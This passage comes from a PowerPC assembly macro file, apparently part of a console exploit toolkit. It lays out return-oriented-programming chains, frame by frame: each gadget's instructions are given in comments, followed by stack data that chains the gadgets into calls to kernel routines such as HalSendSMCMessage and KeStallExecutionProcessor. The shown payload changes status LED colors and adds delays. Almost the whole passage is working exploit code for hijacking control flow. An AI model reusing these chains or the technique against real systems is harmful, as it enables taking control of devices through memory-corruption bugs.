        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131  # r31
        .long   __restgprlr_30          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for next gadget
        #
        #   addi    r1, r1, 0x70
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, \zero_color << 8        # r30 - zero color value
        .long   0x00000000, StatusToLedValues       # r31 - location to store led color value
        .long   stw_r30_on_r31                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store r3=0 led value
        #
        #   stw     r30, 0(r31)
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, \non_zero_color << 8    # r30 - non-zero color value
        .long   0x00000000, StatusToLedValues + 4   # r31 - location to store led color value
        .long   stw_r30_on_r31                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store r3!=0 led value
        #
        #   stw     r30, 0(r31)
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030                                      # r30
        .long   0x00000000, StatusToLedValues + mul_r3_4_lwzx_r11__disp     # r31 - address to load from (with displacement for mul_r3_4_lwzx_r11 gadget)
        .long   mr_r31_to_r11                                               # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup r11 with address to StatusToLedValues
        #
        #   mr      r11, r31
        #   mr      r3, r11
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030              # r30
        .long   0x00000000, arithmetic_scratch1     # r31 - address to load from
        .long   lwz_r3                              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load clamped r3 value
        #
        #   lwz     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, var_8(r1)
        #   mtlr    r12
        #   ld      r31, var_10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, mul_r3_4_lwzx_r11       # r31 - function to call
        .long   call_func_dispatch                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load clamped r3 value
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_30              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load color value
        #
        #   slwi    r10, r3, 2
        #   addi    r11, r11, 0x3D64
        #   lwzx    r3, r10, r11
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: setup for OR operation
        #
        #   addi    r1, r1, 0x70
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x99FF0000              # r30 - color command value
        .long   0x31313131, 0x31313131              # r31
        .long   0x818CB880                          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: OR the SMC led command with the color value chosen
        #
        #   or      r3, r3, r30
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030              # r30
        .long   0x00000000, smc_command_buffer      # r31 - address of command buffer
        .long   stw_r3                              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: write led color override command to smc command buffer
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: call HalSendSMCMessage
        #
        #   r3 = command buffer address
        #   r4 = response = false
        ###########################################################
        CALL_FUNC 111, HalSendSMCMessage, R3H=0, R3L=smc_command_buffer, R4H=0, R4L=0
        
        ###########################################################
        # OPTIMIZACIÓN: Pausa después de cambiar LEDs
        # para asegurar que el cambio es visible
        ###########################################################
        CALL_FUNC 112, KeStallExecutionProcessor, R3H=0, R3L=1, R4H=0, R4L=0, R5H=0, R5L=0, R6H=0, R6L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void BACKOFF_DELAY(iterations)
#
# Implementa un retraso proporcional utilizando un contador
# Útil para crear esperas en bucles sin consumir todos los recursos
#
###########################################################
.macro BACKOFF_DELAY iterations

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, KeStallExecutionProcessor  # r31 - address of delay function
        .long   call_func_dispatch                     # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call KeStallExecutionProcessor con el retardo especificado
        #
        #   r3 = iterations de retardo
        ###########################################################
        CALL_FUNC 999, KeStallExecutionProcessor, R3H=0, R3L=\iterations, R4H=0, R4L=0
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm